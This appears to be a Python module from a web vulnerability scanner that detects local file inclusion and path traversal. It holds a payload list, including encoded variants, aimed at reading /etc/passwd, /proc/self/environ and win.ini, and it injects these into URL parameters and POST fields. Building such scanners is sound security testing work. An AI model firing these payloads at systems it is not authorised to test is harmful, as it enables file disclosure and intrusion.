"""Local File Inclusion / Path Traversal detection module."""

from __future__ import annotations

import re
from typing import Any, Callable
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("lfi")

_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../proc/self/environ",
    "../../../../etc/hosts",
    "..../..../..../..../etc/passwd",
    "..//..//..//..//etc/passwd",
    "....\\....\\....\\....\\windows\\win.ini",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
]

_PARAM_NAMES = re.compile(
    r"(file|path|page|include|template|view|doc|document|folder|dir|download|read)",
    re.IGNORECASE,
)

_EVIDENCE_PATTERNS = [
    re.compile(r"root:x:0:0:", re.IGNORECASE),
    re.compile(r"\[fonts\]", re.IGNORECASE),
    re.compile(r"127\.0\.0\.1\s+localhost", re.IGNORECASE),
    re.compile(r"PATH=", re.IGNORECASE),
    re.compile(r"COMSPEC=", re.IGNORECASE),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _looks_like_file_param(name: str, value: str) -> bool:
    if _PARAM_NAMES.search(name):
        return True
    return any(token in (value or "").lower() for token in (".php", ".txt", "/", "\\"))


def _extract_evidence(response_text: str, baseline_text: str) -> str | None:
    for pattern in _EVIDENCE_PATTERNS:
        match = pattern.search(response_text)
        if match and not pattern.search(baseline_text):
            return f"Observed local file disclosure marker: {match.group(0)}"
    return None


def test_lfi(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    cookie: str | None = None,
    timeout: float = 10.0,
    quick: bool = False,
    should_stop: Callable[[], bool] | None = None,
) -> list[dict[str, Any]]:
    """Run path traversal/LFI checks on discovered parameters."""
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = cookie

    payloads = _PAYLOADS[:4] if quick else _PAYLOADS
    test_endpoints = endpoints[:15] if quick else endpoints
    test_forms = forms[:6] if quick else forms

    with httpx.Client(verify=False, timeout=timeout, follow_redirects=True, headers=headers) as client:
        for url in test_endpoints:
            if should_stop and should_stop():
                log.info("LFI scan cancelled during GET tests")
                break

            params = parse_qs(urlparse(url).query, keep_blank_values=True)
            if not params:
                continue

            try:
                baseline = client.get(url).text
            except httpx.HTTPError:
                baseline = ""

            for param, values in params.items():
                if should_stop and should_stop():
                    break
                value = values[0] if values else ""
                if not _looks_like_file_param(param, value):
                    continue

                sig = (urlparse(url).path, param)
                if sig in seen:
                    continue

                for payload in payloads:
                    if should_stop and should_stop():
                        break
                    target = _inject_param(url, param, payload)
                    try:
                        resp = client.get(target)
                    except httpx.HTTPError:
                        continue
                    evidence = _extract_evidence(resp.text, baseline)
                    if evidence:
                        findings.append(_to_finding(url, param, payload, evidence))
                        seen.add(sig)
                        log.info("[LFI] %s param=%s", url, param)
                        break

        for form in test_forms:
            if should_stop and should_stop():
                log.info("LFI scan cancelled during POST tests")
                break
            if form["method"] != "POST":
                continue

            base_data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
            if not base_data:
                continue

            try:
                baseline = client.post(form["action"], data=base_data).text
            except httpx.HTTPError:
                baseline = ""

            for inp in form["inputs"]:
                if should_stop and should_stop():
                    break
                name = inp["name"]
                if not name:
                    continue
                if not _looks_like_file_param(name, inp.get("value", "")):
                    continue

                sig = (urlparse(form["action"]).path, name)
                if sig in seen:
                    continue

                for payload in payloads:
                    if should_stop and should_stop():
                        break
                    data = dict(base_data)
                    data[name] = payload
                    try:
                        resp = client.post(form["action"], data=data)
                    except httpx.HTTPError:
                        continue
                    evidence = _extract_evidence(resp.text, baseline)
                    if evidence:
                        findings.append(_to_finding(form["action"], name, payload, evidence))
                        seen.add(sig)
                        log.info("[LFI] POST %s param=%s", form["action"], name)
                        break

    log.info("LFI scan complete — %d findings", len(findings))
    return findings


def _to_finding(url: str, param: str, payload: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"Path Traversal / LFI on {urlparse(url).path}",
        "severity": "High",
        "cvss_score": 8.6,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "affected_url": url,
        "parameter": param,
        "payload": payload,
        "evidence": evidence[:300],
        "remediation": "Normalize and validate file paths server-side, block traversal sequences, and enforce strict allowlists for readable files.",
        "owasp_category": "A01:2025 - Broken Access Control",
    }
